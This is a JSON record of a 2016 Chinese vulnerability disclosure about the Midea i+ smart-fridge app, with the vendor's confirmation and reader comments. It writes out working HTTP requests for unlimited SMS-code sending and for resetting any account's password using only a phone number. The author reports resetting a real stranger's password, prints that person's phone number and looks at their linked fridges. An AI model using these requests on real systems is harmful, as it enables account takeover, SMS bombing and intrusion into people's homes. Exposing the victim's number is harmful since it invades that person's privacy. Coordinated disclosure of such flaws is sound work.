{"id": 74427, "wybug_id": "wooyun-2016-0170738", "wybug_title": "美的旗下某app看任意用户密码重置（可控制你家冰箱的漏洞）", "wybug_corp": "midea.com", "wybug_author": "方大核桃", "wybug_date": "2016-01-18 09:03", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证设计不合理", "敏感功能直接对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： 家电的智能化时代正在来临，拥有一款具有大智慧的冰箱，已是追求高品质生活的时尚家庭的标配了。美的冰箱将互联网智能家居理念与产品融入潮流时尚的生活方式，领先业界打造“i+冰箱智能管理系统”，为冰箱装上一个强大的智慧大脑，实现了“它所提供的，正是你所需要的”，颠覆性地将冰箱变成专业化、个性化的高智慧生活管家，为用户带来营养、健康的精智生活，是目前市场上最懂你的智能冰箱。 详细说明：  问题app:美的i+ 安卓版1.使用手机号码注册时发现:发送验证码就是一条get语句:\nGET /ids/apps/getCaptcha?mobile=13888888888 HTTP/1.1Content-Length: 0Host: test.mideav.com:8080Connection: Keep-AliveAccept-Encoding: gzip\n后台为对验证码次数进行限制.亲测可无限轰炸2.手机端点击发送验证码之后,服务器返回验证码到安卓端,抓包截取:\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/html;charset=utf-8Date: Sun, 17 Jan 2016 15:30:34 GMTContent-Length: 68{\"result\":{\"captcha\":\"905697\",\"mobile\":\"13888888888\"},\"errorCode\":0}\n其中905697即为手机端收到的验证码3.手机端重置密码时发送短信验证码也有上述问题:将验证码返回到安卓端,一样可以截获验证码4.修改密码就是一条post语句:\nPOST /ids/apps/resetPassword HTTP/1.1Content-Length: 39Content-Type: application/x-www-form-urlencodedHost: test.mideav.com:8080Connection: Keep-AliveAccept-Encoding: gzipopenid=13888888888&src=1&newpwd=123456\n将其中的openID换成任意用户的手机号即可更改密码证明如下:短信轰炸:\n\n密码重置:\n\n在社区里面选择一个手机号重置密码:手机号:13720113103密码被重置为123456\n\n发现他家尽然有两台冰箱!但是显示的是冰箱已经离线,估计是冰箱没话费了   漏洞证明：  \n\n\n\n\n\n   修复方案：  加班补逻辑漏洞吧...感觉这得大补..沒有仔细测试.rank 给力的话继续~~   版权声明：转载请注明来源 方大核桃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-18 09:20 厂商回复： 新年第一洞？感谢提醒，我们抓程序员加班去。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-18 09:04 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:215 漏洞数:59        | 工欲善其事，必先利其器)\t\t \n  首先你得有一台美的的冰箱    \n     2016-01-18 09:06 |    \t\t骑虎打狗 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 认真对待每个洞..)\t\t \n  @Aasron 哈哈 这个真不需要，首先你要下载APP猜对    \n     2016-01-18 09:40 |    \t\t方大核桃 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:9        | 山东某高校学生)\t\t \n  @骑虎打狗 晚上无聊下了五个app，挨个测试才发现这有问题的。    \n     2016-01-18 20:23 |    \t\t方大核桃 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:9        | 山东某高校学生)\t\t \n  长沙你们赶快修复吧,我已经忍不住要做短信轰炸机了!    \n     2016-01-18 20:24 |    \t\t方大核桃 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:9        | 山东某高校学生)\t\t \n  @方大核桃 长沙->厂商    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}